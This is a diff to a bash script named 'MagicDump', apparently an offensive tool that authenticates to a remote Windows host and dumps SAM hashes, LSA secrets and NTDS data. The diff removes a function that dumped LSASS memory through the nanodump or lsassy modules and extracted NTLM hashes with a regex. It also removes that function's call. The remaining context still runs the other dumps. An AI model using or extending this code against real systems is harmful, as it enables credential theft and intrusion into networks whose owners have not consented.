@@ -308,12 +308,6 @@ parse_lsa_output() {
   done || echo -e "${YELLOW}No LSA secrets found.${RESET}"
 }
 
-parse_lsass_output() {
-  local output_file="$1"
-  echo -e "${GREEN}[LSASS CREDENTIALS FOUND]:${RESET}"
-  grep -oP "[^ ]+\\\\[^ ]+ [0-9a-f]{32}" "$output_file" || echo -e "${YELLOW}No LSASS credentials found.${RESET}"
-}
-
 # Dump Functions
 dump_sam() {
   local output_file="$TARGET_DUMP_DIR/SAM_dump_${TARGET_HOST}.txt"
@@ -344,29 +338,6 @@ dump_lsa() {
   else
     log_operation "LSA" "failed" "\"error\": \"Failed to dump LSA\""
     add_warning "Failed to dump LSA on target $TARGET_HOST"
-  fi
-}
-
-dump_lsass() {
-  local method="${1:-lsassy}"
-  local output_file="$TARGET_DUMP_DIR/LSASS_dump_${TARGET_HOST}.txt"
-  local cmd
-  cmd=$(construct_base_cmd)
-
-  case "$method" in
-    nanodump) cmd+=" -M nanodump" ;;
-    lsassy) cmd+=" -M lsassy" ;;
-    *) echo -e "${RED}[ERROR] Invalid method for LSASS dump.${RESET}"; return 1 ;;
-  esac
-
-  add_log "Starting LSASS dump using $method..."
-  if run_command "$cmd > '$output_file' 2>&1"; then
-    log_operation "LSASS" "success" "\"file_path\": \"$output_file\", \"method\": \"$method\""
-    add_log "LSASS dump saved to $output_file"
-    parse_lsass_output "$output_file"
-  else
-    log_operation "LSASS" "failed" "\"error\": \"Failed to dump LSASS\""
-    add_warning "Failed to dump LSASS on target $TARGET_HOST"
   fi
 }
 
@@ -420,6 +391,5 @@ add_log "Starting MagicDump against target $TARGET_HOST"
 add_log "Authenticating as user '$USERNAME'..."
 dump_sam
 dump_lsa
-dump_lsass
 dump_ntds
 echo -e "${GREEN}[INFO]${RESET} Dumping complete. Logs saved to $LOG_FILE."
